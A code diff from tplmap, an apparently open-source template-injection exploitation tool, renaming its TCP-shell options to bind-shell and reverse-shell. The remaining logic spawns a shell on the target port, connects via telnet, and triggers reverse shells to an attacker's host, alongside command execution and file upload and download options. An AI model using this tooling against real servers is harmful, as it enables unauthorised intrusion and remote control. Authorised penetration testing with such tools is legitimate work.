@@ -65,7 +65,7 @@ def _print_injection_summary(channel):
    Shell command execution: %(execute)s
    File write: %(write)s
    File read: %(read)s
-   Bind and reverse shell: %(tcp_shell)s
+   Bind and reverse shell: %(bind_shell)s
 """ % ({
     'prefix': prefix,
     'render': render,
@@ -78,7 +78,7 @@ def _print_injection_summary(channel):
     'execute': execution,
     'write': writing,
     'read': 'no' if not channel.data.get('read') else 'yes',
-    'tcp_shell': 'no' if not channel.data.get('tcp_shell') else 'yes',
+    'bind_shell': 'no' if not channel.data.get('bind_shell') else 'yes',
 }))
 
 def check_template_injection(channel):
@@ -111,18 +111,18 @@ def check_template_injection(channel):
     # If actions are not required, prints the advices and exit
     if not any(
             f for f,v in channel.args.items() if f in (
-                'os_cmd', 'os_shell', 'upload', 'download', 'tpl_shell', 'tpl_code', 'tcp_shell', 'reverse_tcp_shell'
+                'os_cmd', 'os_shell', 'upload', 'download', 'tpl_shell', 'tpl_code', 'bind_shell', 'reverse_shell'
             ) and v
         ):
 
         log.info(
-            """Rerun tplmap providing one of the following options:%(execute)s%(write)s%(read)s%(tcp_shell)s%(reverse_tcp_shell)s%(execute_blind)s""" % (
+            """Rerun tplmap providing one of the following options:%(execute)s%(write)s%(read)s%(bind_shell)s%(reverse_shell)s%(execute_blind)s""" % (
                 {
-                 'execute': '\n    --os-cmd or --os-shell to access the underlying operating system' if channel.data.get('execute') and not channel.data.get('execute_blind') else '',
+                 'execute': '\n    --os-shell or --os-cmd to execute shell commands via the injection' if channel.data.get('execute') and not channel.data.get('execute_blind') else '',
+                 'bind_shell': '\n    --bind-shell PORT to bind a shell on a port and connect to it' if channel.data.get('bind_shell') else '',
+                 'reverse_shell': '\n    --reverse-shell HOST PORT to run a shell back to the attacker\'s HOST PORT' if channel.data.get('reverse_shell') else '',
                  'write': '\n    --upload LOCAL REMOTE to upload files to the server' if channel.data.get('write') else '',
                  'read': '\n    --download REMOTE LOCAL to download remote files' if channel.data.get('read') else '',
-                 'tcp_shell': '\n    --tcp-shell PORT to run an out-of-bound TCP shell on the remote PORT and connect to it' if channel.data.get('tcp_shell') else '',
-                 'reverse_tcp_shell': '\n    --reverse-tcp-shell HOST PORT to run a system shell and connect back to local HOST PORT' if channel.data.get('reverse_tcp_shell') else '',
                  'execute_blind': '\n    --os-cmd or --os-shell to execute blind shell commands on the underlying operating system' if channel.data.get('execute_blind') else '',
                  }
             )
@@ -212,19 +212,19 @@ def check_template_injection(channel):
             log.error('No file download capabilities have been detected on the target')
 
     # Connect to tcp shell
-    tcp_shell_port = channel.args.get('tcp_shell')
-    if tcp_shell_port:
+    bind_shell_port = channel.args.get('bind_shell')
+    if bind_shell_port:
 
-        if channel.data.get('tcp_shell'):
+        if channel.data.get('bind_shell'):
 
             urlparsed = urlparse.urlparse(channel.base_url)
             if not urlparsed.hostname:
                 log.error("Error parsing hostname")
                 return
 
-            for idx, thread in enumerate(current_plugin.tcp_shell(tcp_shell_port)):
+            for idx, thread in enumerate(current_plugin.bind_shell(bind_shell_port)):
 
-                log.info('Spawn a shell on remote port %i with payload %i' % (tcp_shell_port, idx+1))
+                log.info('Spawn a shell on remote port %i with payload %i' % (bind_shell_port, idx+1))
 
                 thread.join(timeout=1)
 
@@ -233,7 +233,7 @@ def check_template_injection(channel):
 
                 try:
 
-                    telnetlib.Telnet(urlparsed.hostname, tcp_shell_port, timeout = 5).interact()
+                    telnetlib.Telnet(urlparsed.hostname, bind_shell_port, timeout = 5).interact()
 
                     # If telnetlib does not rise an exception, we can assume that
                     # ended correctly and return from `run()`
@@ -242,7 +242,7 @@ def check_template_injection(channel):
                     log.debug(
                         "Error connecting to %s:%i %s" % (
                             urlparsed.hostname,
-                            tcp_shell_port,
+                            bind_shell_port,
                             e
                         )
                     )
@@ -252,14 +252,14 @@ def check_template_injection(channel):
             log.error('No TCP shell opening capabilities have been detected on the target')
 
     # Accept reverse tcp connections
-    reverse_tcp_shell_host_port = channel.args.get('reverse_tcp_shell')
-    if reverse_tcp_shell_host_port:
-        host, port = reverse_tcp_shell_host_port
+    reverse_shell_host_port = channel.args.get('reverse_shell')
+    if reverse_shell_host_port:
+        host, port = reverse_shell_host_port
         timeout = 5
 
-        if channel.data.get('reverse_tcp_shell'):
+        if channel.data.get('reverse_shell'):
 
-            current_plugin.reverse_tcp_shell(host, port)
+            current_plugin.reverse_shell(host, port)
 
             # Run tcp server
             try:
